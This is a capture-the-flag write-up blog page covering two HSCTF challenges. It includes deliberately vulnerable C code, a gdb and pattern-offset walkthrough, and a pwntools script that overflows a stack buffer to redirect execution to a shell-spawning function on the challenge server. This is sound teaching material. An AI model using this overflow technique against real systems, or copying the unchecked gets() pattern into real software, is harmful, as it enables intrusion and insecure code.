<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>HSCTF - Binary Exploitation Challenges</title>
<link rel="stylesheet" href="/css/main.css">
<link rel="stylesheet" href="/css/monokai.css">
<link rel="stylesheet" href="/css/font-awesome.min.css">
<script src="https://kit.fontawesome.com/c569d89c48.js"></script>
</head>

  <body>
    <div id="wrapper">
        <header>
	<div id="home">
		<a href="/">
			<h1>Syed Faraz Abrar</h1>
		</a>
	</div>
	<div class="header-links">
		<a href="/writeups"><h2 class="header-link">Writeups</h2></a>
<a href="/about"><h2 class="header-link">About</h2></a>
	</div>
</header>
        <div class="container">
            <section id="main_content">
                <h1 id="title">HSCTF - Binary Exploitation Challenges</h1>
<p>23 Jun 2019</p>

<ul class="section-nav">
<li class="toc-entry toc-h1"><a href="#intro-to-netcat">Intro To Netcat</a>
<ul>
<li class="toc-entry toc-h3"><a href="#challenge">Challenge</a></li>
<li class="toc-entry toc-h3"><a href="#solution">Solution</a></li>
</ul>
</li>
<li class="toc-entry toc-h1"><a href="#return-to-sender">Return To Sender</a>
<ul>
<li class="toc-entry toc-h3"><a href="#challenge-1">Challenge</a></li>
<li class="toc-entry toc-h3"><a href="#solution-1">Solution</a></li>
</ul>
</li>
</ul>

<h1 id="intro-to-netcat">Intro To Netcat</h1>

<h3 id="challenge">Challenge</h3>

<blockquote>
  <p>Written by: Ptomerty</p>

  <p>Hey there! This challenge is a quick introduction to netcat and how to use it. Netcat is a program that will help you “talk” with many of our challenges, especially pwn and misc. To begin, Windows users should download this file: https://drive.google.com/open?id=1Z8MS8SZYqZrteXOVPRL7BHwB4JL9t9J8</p>

  <p>Extract the file, then open a command prompt and navigate to the directory using <code class="highlighter-rouge">cd &lt;download-directory&gt;</code>. From there, you can run <code class="highlighter-rouge">nc misc.hsctf.com 1111</code> to get your first flag.</p>

  <p>Have fun!</p>
</blockquote>

<h3 id="solution">Solution</h3>

<p>A very simple challenge.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» nc misc.hsctf.com 1111
Hey, here's your flag! hsctf{internet_cats}
</code></pre></div></div>

<p>Flag: <code class="highlighter-rouge">hsctf{internet_cats}</code></p>

<h1 id="return-to-sender">Return To Sender</h1>

<h3 id="challenge-1">Challenge</h3>

<blockquote>
  <p>Written by: Ptomerty</p>

  <p>Who knew the USPS could lose a letter so many times?</p>

  <p>nc pwn.hsctf.com 1234</p>

  <p>Note: If you’re trying to use python or a similar program to run your exploit, make sure to keep stdin alive with cat, like this: (python; cat -) | nc pwn.hsctf.com <port></port></p>
</blockquote>

<p>The challenge archive contains the following files.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>return-to-sender
return-to-sender.c
</code></pre></div></div>

<h3 id="solution-1">Solution</h3>

<p>This was a simple binary exploitation challenge that involved overflowing a buffer on the stack to change a return address.</p>

<p>The vulnerable code is shown below.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// gcc return-to-sender.c -o return-to-sender -m32 -no-pie -g0 -fno-stack-protector</span>

<span class="cp">#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
</span>
<span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="n">dest</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Where are you sending your mail to today? "</span><span class="p">);</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">dest</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Alright, to %s it goes!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dest</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
  <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span><span class="n">gid</span><span class="p">,</span><span class="n">gid</span><span class="p">);</span>
  <span class="n">vuln</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>	
<span class="p">}</span>
</code></pre></div></div>

<p>The <code class="highlighter-rouge">vuln()</code> function calls <code class="highlighter-rouge">gets()</code> to get user input. The <code class="highlighter-rouge">gets()</code> function performs zero bounds checking on the user input, thus we can input as many characters as we want to overflow the <code class="highlighter-rouge">dest</code> buffer. In this case, we have to do a controlled buffer overflow so that we gain control of the return pointer of <code class="highlighter-rouge">vuln()</code>, which will then allow us to point it to the <code class="highlighter-rouge">win()</code> function and get a shell.</p>

<p>Let’s run <code class="highlighter-rouge">checksec</code> on the binary.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» checksec <span class="k">return</span><span class="nt">-to-sender</span>                                                                     
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/faithlesss/Documents/ctfs/hsctf-6/pwn/return-to-sender/bin/return-to-sender'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
</code></pre></div></div>

<p>We see that there is no stack canary (and therefore no protection to a buffer overflow attack), no ASLR (Address Space Layout Randomization), and the stack is Not Executable (NX).</p>

<p>First, we have to show that the program indeed does crash when a huge string is passed to it.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» ./return-to-sender                                                                            
Where are you sending your mail to today? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
Alright, to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa it goes!
<span class="o">[</span>1]    30852 segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>  ./return-to-sender
</code></pre></div></div>

<p>We’ve successfully crashed the program. Let’s start gdb and see exactly what happened.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» gdb ./return-to-sender                                                                        
Reading symbols from ./return-to-sender...
<span class="o">(</span>No debugging symbols found <span class="k">in</span> ./return-to-sender<span class="o">)</span>
<span class="o">(</span>gdb<span class="o">)</span> run
Starting program: /home/faithlesss/Documents/ctfs/hsctf-6/pwn/return-to-sender/bin/return-to-sender 
BFD: warning: /lib/ld-linux.so.2: corrupt GNU_PROPERTY_TYPE <span class="o">(</span>5<span class="o">)</span> size: 0
BFD: warning: /lib/ld-linux.so.2: corrupt GNU_PROPERTY_TYPE <span class="o">(</span>5<span class="o">)</span> size: 0
BFD: warning: /lib/ld-linux.so.2: corrupt GNU_PROPERTY_TYPE <span class="o">(</span>5<span class="o">)</span> size: 0
Where are you sending your mail to today? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Alright, to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA it goes!

Program received signal SIGSEGV, Segmentation fault.
0x41414141 <span class="k">in</span> ?? <span class="o">()</span>
<span class="o">(</span>gdb<span class="o">)</span> 

</code></pre></div></div>

<p>At the bottom, we can see that it receives a seg fault when trying to access memory location <code class="highlighter-rouge">0x41414141</code>. <code class="highlighter-rouge">0x41</code> is the ascii hex value of ‘A’, thus we overwrote the return pointer with four ‘A’s, which meant that after the <code class="highlighter-rouge">vuln()</code> function finished, it tried to return into <code class="highlighter-rouge">0x41414141</code>.</p>

<p>Now, we have to figure out the offset at which we control the return pointer (i.e, how many A’s can we enter before we can enter BBBB and set the return pointer to 0x42424242?). I use metasploit’s <code class="highlighter-rouge">pattern_create.rb</code> to generate a unique pattern of 200 characters, then pass it to gdb.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» pattern_create <span class="nt">-l</span> 200               
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

» gdb ./return-to-sender                                                                                                                                          faithlesss@arch
Reading symbols from ./return-to-sender...
<span class="o">(</span>No debugging symbols found <span class="k">in</span> ./return-to-sender<span class="o">)</span>
<span class="o">(</span>gdb<span class="o">)</span> run
Starting program: /home/faithlesss/Documents/ctfs/hsctf-6/pwn/return-to-sender/bin/return-to-sender 
BFD: warning: /lib/ld-linux.so.2: corrupt GNU_PROPERTY_TYPE <span class="o">(</span>5<span class="o">)</span> size: 0
BFD: warning: /lib/ld-linux.so.2: corrupt GNU_PROPERTY_TYPE <span class="o">(</span>5<span class="o">)</span> size: 0
BFD: warning: /lib/ld-linux.so.2: corrupt GNU_PROPERTY_TYPE <span class="o">(</span>5<span class="o">)</span> size: 0
Where are you sending your mail to today? Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Alright, to Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag it goes!

Program received signal SIGSEGV, Segmentation fault.
0x37614136 <span class="k">in</span> ?? <span class="o">()</span>
<span class="o">(</span>gdb<span class="o">)</span> 

</code></pre></div></div>

<p>Alright, now we get a seg fault at <code class="highlighter-rouge">0x37614136</code>. I then use metasploit’s <code class="highlighter-rouge">pattern_offset.rb</code> to find at which offset the crash occurred.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» pattern_offset <span class="nt">-l</span> 200 <span class="nt">-q</span> 37614136                                                             
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exact match at offset 20
</code></pre></div></div>

<p>Now we know that after inputting 20 ‘A’s, the next four bytes that we input will overwrite the return pointer. Now, what we want to do is execute the <code class="highlighter-rouge">win()</code> function and get a shell. This means that the return pointer just needs to be overwritten with the address of the <code class="highlighter-rouge">win()</code> function. I wrote up a python script using pwntools that does just that.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Connect to the process on the remote ip and port
</span><span class="n">connection</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="s">"pwn.hsctf.com"</span><span class="p">,</span> <span class="mi">1234</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./return-to-sender"</span><span class="p">)</span>

<span class="n">win_addr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'win'</span><span class="p">])</span> <span class="c1"># The address of the win function
</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">20</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">win_addr</span>

<span class="c1"># Receive the starting text, then send the payload through
</span><span class="n">connection</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">connection</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="c1"># Make the connection interactive since win() opens a shell for us
</span><span class="n">connection</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">connection</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p>The exploit basically connects to the ip and port given to us in the challenge, and sends 20 A’s, followed by the address of the <code class="highlighter-rouge">win()</code> function. The address overwrite’s the return pointer of <code class="highlighter-rouge">vuln()</code>.
What this will do is it will cause the <code class="highlighter-rouge">vuln()</code> function to jump to the <code class="highlighter-rouge">win()</code> function instead of back to the <code class="highlighter-rouge">main()</code> function after it has finished executing.</p>

<p>Running the exploit gives us a shell, which we then use to get the flag:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» python exploit.py                                                                                                                                               faithlesss@arch
<span class="o">[</span>+] Opening connection to pwn.hsctf.com on port 1234: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/faithlesss/Documents/ctfs/hsctf-6/pwn/return-to-sender/bin/return-to-sender'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
Alright, to AAAAAAAAAAAAAAAAAAAA<span class="se">\x</span>b6<span class="se">\x</span>91<span class="se">\x</span>0 it goes!
<span class="nv">$ </span><span class="nb">ls
</span>bin
dev
flag
lib
lib32
lib64
<span class="k">return</span><span class="nt">-to-sender</span>
<span class="k">return</span><span class="nt">-to-sender</span>.c
<span class="nv">$ </span><span class="nb">cat </span>flag
hsctf<span class="o">{</span>fedex_dont_fail_me_now<span class="o">}</span>
<span class="nv">$ </span> 
</code></pre></div></div>

<p>Flag: <code class="highlighter-rouge">hsctf{fedex_dont_fail_me_now}</code></p>

            </section>
        </div>
    </div>
    <footer>
  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
    <span>
        <b>Creative Commons 3.0</b>
    </span>
    
    <span> - 2019</span>
  </a>
</footer>
  </body>
</html>